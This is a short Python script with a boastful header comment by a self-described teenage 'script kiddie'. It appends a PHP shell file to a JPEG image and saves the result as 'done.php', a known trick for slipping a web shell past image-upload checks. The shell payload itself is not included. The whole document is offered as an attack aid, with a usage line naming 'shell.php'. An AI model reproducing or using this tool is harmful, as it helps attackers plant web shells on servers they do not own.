#Coded By Skidie Khan. A 16YO Script Kiddie B| Salam to all muslim brothers. usage: python script.py image.jpg shell.php
from sys import argv
script, img, shell = argv
i = open(img,'rb').read()
i += open(shell,'rb').read()
f = open('done.php','wb').write(i)